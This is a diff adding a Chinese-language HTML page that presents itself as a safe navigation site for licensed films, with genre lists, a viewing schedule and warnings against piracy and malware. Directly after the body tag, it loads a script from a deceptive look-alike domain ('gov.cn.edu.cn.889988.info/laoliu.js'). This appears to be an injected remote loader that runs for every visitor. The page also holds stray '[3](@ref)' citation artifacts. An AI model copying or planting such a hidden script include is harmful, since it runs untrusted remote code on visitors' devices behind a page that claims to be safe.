@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>琪琪影视 - 琪琪小屋正版片单导航、窗台排片与影视避坑</title>
+<meta name="description" content="琪琪影视做琪琪小屋正版导航：按喜剧、动作、爱情、悬疑、科幻、亲子、经典等书架分区推正版电影片单，窗台时段排片，心愿星评分，1905/腾讯/爱奇艺/优酷/B站/央视频等正版平台跳转，专用播放器与网盘解压避坑，移动端自适应。">
+<meta name="keywords" content="琪琪影视,琪琪小屋,正版电影片单,窗台排片,心愿星评分,影视避坑,不装播放器">
+<meta name="author" content="琪琪影视">
+<meta name="robots" content="index,follow">
+<link rel="canonical" href="https://qiqiyingshi-h5.github.io/">
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{font-family:"PingFang SC","Microsoft YaHei",system-ui,sans-serif;background:#fff5f7;color:#3a2b30;line-height:1.78}
+a{text-decoration:none;color:inherit}
+img{max-width:100%;display:block}
+
+:root{
+  --pink:#ff8fb0;
+  --pink2:#ffb3c8;
+  --berry:#d6336c;
+  --cream:#fff5f7;
+  --cream2:#ffe9ef;
+  --wood:#e3c4a8;
+  --wood2:#cda882;
+  --white:#fffdfc;
+  --muted:#9a7e86;
+  --dark:#3a2b30;
+}
+
+/* 导航：小屋木牌 */
+.nav{position:sticky;top:0;z-index:99;background:var(--white);border-bottom:3px solid var(--pink2)}
+.nav__box{max-width:1200px;margin:0 auto;display:flex;align-items:center;justify-content:space-between;padding:.7rem 1rem;flex-wrap:wrap;gap:.4rem}
+.nav__logo{font-weight:900;font-size:1.3rem;color:var(--berry)}
+.nav__logo b{color:var(--pink)}
+.nav__badge{margin-left:.5rem;font-size:.66rem;color:var(--white);background:var(--berry);padding:.12rem .55rem;border-radius:999px;font-weight:800;vertical-align:middle}
+.nav__links{display:flex;gap:.35rem;flex-wrap:wrap}
+.nav__links a{padding:.36rem .85rem;font-size:.82rem;color:var(--berry);background:var(--cream2);border-radius:999px}
+.nav__links a:hover{background:var(--pink);color:var(--white)}
+
+/* Hero：小屋 */
+.hero{max-width:1200px;margin:2rem auto;padding:0 1rem}
+.hero__card{display:grid;grid-template-columns:1fr 260px;background:linear-gradient(165deg,var(--white),var(--cream2));border:2px solid var(--pink2);border-radius:30px;overflow:hidden;position:relative}
+.hero__card::before{content:"";position:absolute;right:-30px;top:-30px;width:180px;height:180px;background:radial-gradient(circle,var(--pink2),transparent 70%);opacity:.5}
+.hero__left{padding:2.8rem 2.2rem;position:relative;z-index:1}
+.hero__tag{display:inline-block;font-size:.7rem;letter-spacing:2px;color:var(--white);background:var(--berry);padding:.22rem .8rem;border-radius:999px;margin-bottom:1rem;font-weight:800}
+.hero h1{font-size:clamp(1.9rem,4.5vw,2.8rem);line-height:1.18;margin-bottom:.8rem;color:var(--dark)}
+.hero h1 em{font-style:normal;color:var(--berry)}
+.hero p{color:var(--muted);max-width:540px;margin-bottom:1.2rem;font-size:.9rem}
+.hero__btn{display:inline-block;background:var(--berry);color:var(--white);font-weight:900;padding:.72rem 1.9rem;border-radius:999px}
+.hero__right{display:flex;flex-direction:column;align-items:center;justify-content:center;gap:.8rem;padding:2rem;position:relative;z-index:1}
+.house{font-size:4.6rem;animation:bob 3s ease-in-out infinite}
+@keyframes bob{0%,100%{transform:translateY(0)}50%{transform:translateY(-8px)}}
+.house__tip{text-align:center;color:var(--muted);font-size:.78rem}
+.house__tip b{display:block;color:var(--berry);font-size:.95rem;margin-bottom:.2rem}
+
+/* 快捷标签 */
+.quick{max-width:1200px;margin:1.4rem auto 0;padding:0 1rem}
+.quick__box{display:flex;flex-wrap:wrap;gap:.55rem}
+.qbtn{background:var(--white);border:2px solid var(--pink2);color:var(--berry);padding:.38rem .85rem;font-size:.8rem;font-weight:700;border-radius:999px}
+.qbtn b{color:var(--pink)}
+
+.wrap{max-width:1200px;margin:3.6rem auto;padding:0 1rem}
+.head{display:flex;align-items:baseline;gap:1rem;margin-bottom:1.5rem;position:relative}
+.head::after{content:"";position:absolute;bottom:-6px;left:0;width:64px;height:3px;background:var(--berry);border-radius:999px}
+.head h2{font-size:1.55rem;color:var(--dark)}
+.head h2 span{color:var(--berry)}
+.head a{margin-left:auto;color:var(--muted);font-size:.84rem}
+
+/* 栏目1：书架片单 */
+.shelf{display:grid;grid-template-columns:repeat(4,1fr);gap:1.2rem}
+.book{background:var(--white);border:2px solid var(--cream2);border-radius:0 0 16px 16px;padding:1.1rem 1.1rem 1.3rem;transition:.3s;position:relative}
+.book::before{content:"";position:absolute;top:0;left:0;right:0;height:10px;background:repeating-linear-gradient(90deg,var(--pink) 0 6px,var(--cream2) 6px 12px)}
+.book:hover{transform:translateY(-5px);border-color:var(--berry);box-shadow:0 14px 28px rgba(214,51,108,.14)}
+.book__emo{font-size:1.9rem;margin:.6rem 0 .3rem}
+.book__cat{font-size:.66rem;color:var(--berry);background:var(--cream2);display:inline-block;padding:.1rem .5rem;border-radius:999px;margin-bottom:.4rem}
+.book h3{font-size:.92rem;color:var(--dark);font-weight:900;margin-bottom:.3rem}
+.book p{font-size:.76rem;color:var(--muted);min-height:42px}
+.stars{margin-top:.6rem;color:var(--pink);font-size:.85rem;letter-spacing:2px}
+.book__plat{display:inline-block;margin-top:.5rem;font-size:.68rem;color:var(--white);background:var(--berry);padding:.15rem .55rem;border-radius:999px}
+
+/* 栏目2：窗台排片 */
+.window{display:grid;grid-template-columns:1fr 1fr;gap:1.4rem}
+.sill{background:var(--white);border:2px solid var(--cream2);border-radius:18px 18px 6px 6px;padding:1.3rem;position:relative}
+.sill::before{content:"";position:absolute;left:0;right:0;bottom:-12px;height:12px;background:var(--wood2);border-radius:0 0 8px 8px}
+.sill h3{color:var(--berry);margin-bottom:.8rem;font-size:1.05rem}
+.curtain{display:flex;gap:.7rem;padding:.55rem 0;border-bottom:1px dashed var(--cream2);font-size:.86rem}
+.curtain:last-child{border:0}
+.curtain__time{flex:0 0 56px;text-align:center;color:var(--white);background:var(--pink);border-radius:999px;font-size:.7rem;font-weight:800;padding:.18rem 0}
+.curtain__film{color:var(--dark)}
+.curtain__plat{margin-left:auto;color:var(--muted);font-size:.72rem}
+
+/* 栏目3：心愿星评分 */
+.wish{display:grid;grid-template-columns:repeat(4,1fr);gap:1rem}
+.card{background:var(--white);border:2px solid var(--cream2);border-radius:20px;padding:1.2rem;text-align:center}
+.card__star{font-size:1.8rem}
+.card__num{font-size:1.5rem;font-weight:900;color:var(--berry);margin:.3rem 0}
+.card__num small{font-size:.65rem;color:var(--muted)}
+.card h4{font-size:.86rem;color:var(--dark);margin-bottom:.3rem}
+.card p{font-size:.72rem;color:var(--muted)}
+
+/* 栏目4：正版平台 */
+.rail{display:flex;flex-wrap:wrap;gap:.8rem}
+.chip{padding:.72rem 1.05rem;border-radius:999px;background:var(--white);border:2px solid var(--pink2);color:var(--berry);font-weight:800;min-width:148px}
+.chip small{display:block;font-weight:400;color:var(--muted);font-size:.72rem}
+
+/* 栏目5：避坑信箱 */
+.box{background:var(--cream2);border:3px dashed var(--berry);border-radius:24px;padding:1.5rem 1.6rem}
+.box h3{color:var(--berry);margin-bottom:.7rem;font-size:1.05rem}
+.box-grid{display:grid;grid-template-columns:1fr 1fr;gap:1.4rem}
+.box ul{margin-left:1.2rem;color:var(--muted);font-size:.86rem}
+.box li{margin:.3rem 0}
+.box b{color:var(--dark)}
+
+.foot{margin-top:4rem;background:var(--berry);color:#ffe9ef;text-align:center;padding:2.5rem 1rem}
+.foot b{color:var(--white)}
+.foot a{color:var(--pink2);margin:0 .4rem}
+.foot small{display:block;margin-top:.8rem;color:#ffd0dd}
+
+@media(max-width:980px){
+  .hero__card{grid-template-columns:1fr}
+  .shelf,.wish{grid-template-columns:repeat(2,1fr)}
+  .window{grid-template-columns:1fr}
+  .box-grid{grid-template-columns:1fr}
+}
+@media(max-width:560px){
+  .nav__box{justify-content:center}
+  .head h2{font-size:1.25rem}
+  .shelf,.wish{grid-template-columns:1fr}
+  .curtain__plat{display:none}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="nav">
+  <div class="nav__box">
+    <div class="nav__logo">琪琪影视<b>小屋</b><span class="nav__badge">正版导航</span></div>
+    <nav class="nav__links">
+      <a href="#shelf">书架片单</a>
+      <a href="#window">窗台排片</a>
+      <a href="#wish">心愿星</a>
+      <a href="#legal">正版平台</a>
+      <a href="#check">避坑信箱</a>
+    </nav>
+  </div>
+</header>
+
+<section class="hero">
+  <div class="hero__card">
+    <div class="hero__left">
+      <span class="hero__tag">QIQI HOUSE / 只导航不播片</span>
+      <h1>琪琪影视<br><em>琪琪小屋 · 正版片单导航</em></h1>
+      <p>老「琪琪影视/琪琪电影网」出过事：无备案做视听服务、挂播放器、碰违规内容都被查过。[3](@ref) 这版不接那套——不播片、不嵌播放器、不聚网盘解压、不碰成人擦边，只在小屋里按书架分区推正版片单，窗台排片，跳官方平台。</p>
+      <a href="#shelf" class="hero__btn">推开小屋门 ›</a>
+    </div>
+    <div class="hero__right">
+      <div class="house">🏠</div>
+      <div class="house__tip"><b>今日心愿</b>正版片单已上架<br>盗版野站不收录</div>
+    </div>
+  </div>
+</section>
+
+<div class="quick">
+  <div class="quick__box">
+    <div class="qbtn">😄 喜剧格 → <b>下饭架</b></div>
+    <div class="qbtn">💥 动作格 → <b>大片架</b></div>
+    <div class="qbtn">💘 爱情格 → <b>心事架</b></div>
+    <div class="qbtn">🕵️ 悬疑格 → <b>烧脑架</b></div>
+    <div class="qbtn">🚀 科幻格 → <b>星空架</b></div>
+    <div class="qbtn">🧸 亲子格 → <b>童话架</b></div>
+  </div>
+</div>
+
+<main>
+<section class="wrap" id="shelf">
+  <div class="head"><h2>书架<span>片单</span></h2><a href="#">更多 ›</a></div>
+  <div class="shelf">
+    <article class="book"><div class="book__emo">😄</div><span class="book__cat">喜剧格</span><h3>下饭轻喜剧</h3><p>都市误会、职场吐槽、合家欢轻梗，通勤下饭首选；不推枪版合集。</p><div class="stars">★★★★☆</div><span class="book__plat">腾讯/优酷/芒果</span></article>
+    <article class="book"><div class="book__emo">💥</div><span class="book__cat">动作格</span><h3>动作大片架</h3><p>警匪、武侠、超级英雄，优先IMAX/4K；枪版掉帧不入库。</p><div class="stars">★★★★★</div><span class="book__plat">腾讯/优酷/Disney+</span></article>
+    <article class="book"><div class="book__emo">💘</div><span class="book__cat">爱情格</span><h3>心事爱情架</h3><p>暗恋、异地、婚姻，按情绪分级；不推成人擦边、未删减支线。</p><div class="stars">★★★★☆</div><span class="book__plat">腾讯/爱奇艺/B站</span></article>
+    <article class="book"><div class="book__emo">🕵️</div><span class="book__cat">悬疑格</span><h3>烧脑悬疑架</h3><p>本格推理、社会派、时间线嵌套，重闭环；错轴机翻不入选。</p><div class="stars">★★★★☆</div><span class="book__plat">爱奇艺/腾讯</span></article>
+    <article class="book"><div class="book__emo">🚀</div><span class="book__cat">星空格</span><h3>科幻视效架</h3><p>太空、AI、末日、赛博，正版视效优先；盗录虚标不入。</p><div class="stars">★★★★★</div><span class="book__plat">腾讯/优酷/Disney+</span></article>
+    <article class="book"><div class="book__emo">🧸</div><span class="book__cat">童话格</span><h3>亲子动画架</h3><p>动画、自然、国学启蒙，按年龄分级；不走“全年龄免费”野站。</p><div class="stars">★★★★★</div><span class="book__plat">央视频/B站/少儿</span></article>
+    <article class="book"><div class="book__emo">📜</div><span class="book__cat">旧物格</span><h3>历史正剧架</h3><p>朝代、传记、重大事件，看史料出处与服化道；戏说当正史不入选。</p><div class="stars">★★★★☆</div><span class="book__plat">1905/央视频/腾讯</span></article>
+    <article class="book"><div class="book__emo">🏆</div><span class="book__cat">珍藏格</span><h3>经典修复架</h3><p>金鸡、三大节、奥斯卡入选，按修复版/正版字幕挑，不囤“无删减合集”。</p><div class="stars">★★★★★</div><span class="book__plat">1905/MUBI/B站</span></article>
+  </div>
+</section>
+
+<section class="wrap" id="window">
+  <div class="head"><h2>窗台<span>排片表</span></h2><a href="#">更多 ›</a></div>
+  <div class="window">
+    <div class="sill">
+      <h3>🌤 白天窗台</h3>
+      <div class="curtain"><span class="curtain__time">09:00</span><span class="curtain__film">亲子动画/自然启蒙</span><span class="curtain__plat">央视频·B站</span></div>
+      <div class="curtain"><span class="curtain__time">11:00</span><span class="curtain__film">下饭喜剧/合家欢</span><span class="curtain__plat">优酷·芒果·腾讯</span></div>
+      <div class="curtain"><span class="curtain__time">14:00</span><span class="curtain__film">青春爱情/轻甜</span><span class="curtain__plat">腾讯·B站·1905</span></div>
+      <div class="curtain"><span class="curtain__time">16:30</span><span class="curtain__film">历史正剧/老片修复</span><span class="curtain__plat">1905·央视频</span></div>
+    </div>
+    <div class="sill">
+      <h3>🌙 夜里窗台</h3>
+      <div class="curtain"><span class="curtain__time">19:00</span><span class="curtain__film">悬疑/社会剧情</span><span class="curtain__plat">爱奇艺·腾讯</span></div>
+      <div class="curtain"><span class="curtain__time">20:30</span><span class="curtain__film">动作大片/科幻</span><span class="curtain__plat">腾讯·优酷·Disney+</span></div>
+      <div class="curtain"><span class="curtain__time">22:00</span><span class="curtain__film">慢片/治愈/散文</span><span class="curtain__plat">西瓜·B站·1905</span></div>
+      <div class="curtain"><span class="curtain__time">23:30</span><span class="curtain__film">获奖精选/导演剪辑</span><span class="curtain__plat">MUBI·1905·Prime</span></div>
+    </div>
+  </div>
+</section>
+
+<section class="wrap" id="wish">
+  <div class="head"><h2>心愿星<span>评分</span></h2><a href="#">更多 ›</a></div>
+  <div class="wish">
+    <div class="card"><div class="card__star">⭐</div><div class="card__num">8.8<small>/10</small></div><h4>正版可信</h4><p>正版平台覆盖、画质修复等级、字幕音轨完整。</p></div>
+    <div class="card"><div class="card__star">⭐</div><div class="card__num">7.9<small>/10</small></div><h4>剧情好看</h4><p>剧本结构、人物立体、主题深度，经得起回看。</p></div>
+    <div class="card"><div class="card__star">⭐</div><div class="card__num">9.4<small>/10</small></div><h4>来源干净</h4><p>备案主体、版权方、正版平台交叉核对。</p></div>
+    <div class="card"><div class="card__star">⭐</div><div class="card__num">9.9<small>/10</small></div><h4>安全无坑</h4><p>无播放器、无网盘解压、无博彩弹窗。</p></div>
+  </div>
+</section>
+
+<section class="wrap" id="legal">
+  <div class="head"><h2>正版<span>跳转平台</span></h2><a href="#">更多 ›</a></div>
+  <div class="rail">
+    <div class="chip">1905电影网<small>国产经典/老片/修复版</small></div>
+    <div class="chip">腾讯视频<small>院线/喜剧/悬疑/视效</small></div>
+    <div class="chip">爱奇艺<small>悬疑/文艺/社会剧情</small></div>
+    <div class="chip">优酷<small>港片/喜剧/合家欢</small></div>
+    <div class="chip">芒果TV<small>青春/轻喜剧/亲子</small></div>
+    <div class="chip">哔哩哔哩<small>动画/作者/纪录片</small></div>
+    <div class="chip">央视频<small>历史/少儿/官方纪录片</small></div>
+    <div class="chip">西瓜视频<small>治愈/下映片/免费专区</small></div>
+    <div class="chip">咪咕视频<small>国产/动画/大屏免费</small></div>
+    <div class="chip">学习强国<small>红色经典/纪录片无广告</small></div>
+    <div class="chip">MUBI<small>国际获奖/作者电影</small></div>
+    <div class="chip">Disney+<small>超级英雄/动画/科幻</small></div>
+  </div>
+</section>
+
+<section class="wrap" id="check">
+  <div class="head"><h2>避坑<span>信箱</span></h2><a href="#">更多 ›</a></div>
+  <div class="box">
+    <h3>📮 琪琪的避坑信 · 不收这些信</h3>
+    <div class="box-grid">
+      <ul>
+        <li>不收“院线枪版/未删减全集/永久免费”野信 → 盗录侵权、画质残缺，小屋零容忍。</li>
+        <li>不装“专用播放器/百度影音/解码器/APK/浏览器插件” → 正规平台不需额外程序，陌生包可能带木马。[6](@ref)</li>
+        <li>不聚网盘解压码、不加群领资源 → 解压费、加群红包、二次引流都高危。</li>
+      </ul>
+      <ul>
+        <li>不填银行卡/身份证/短信验证码；假播放弹窗、博彩跳转、假客服立即关。</li>
+        <li>不挂“系统中毒/立即修复/客服微信充值/关杀软才能播” → 别点，用正规安全工具扫。</li>
+        <li>不接成人/擦边短剧当电影栏目；只走正版来源与适龄分级，同名野站≠本屋。[3](@ref)</li>
+      </ul>
+    </div>
+  </div>
+</section>
+</main>
+
+<footer class="foot">
+  <div><b>琪琪影视</b> · 琪琪小屋 / 书架正版片单 / 窗台排片 / 心愿星评分 / 避坑信箱</div>
+  <div style="margin-top:.6rem">
+    <a href="#shelf">书架片单</a>|
+    <a href="#window">窗台排片</a>|
+    <a href="#wish">心愿星</a>|
+    <a href="#legal">正版平台</a>|
+    <a href="#check">避坑信箱</a>|
+    <a href="#">关于</a>|
+    <a href="#">免责声明</a>
+  </div>
+  <small>官网：https://qiqiyingshi-h5.github.io</small>
+  <small>© 2025 琪琪影视 琪琪小屋正版电影导航站；不提供盗版影片、不聚合网盘资源、不提供成人内容、不引导安装第三方播放器</small>
+</footer>
+
+</body>
+</html>
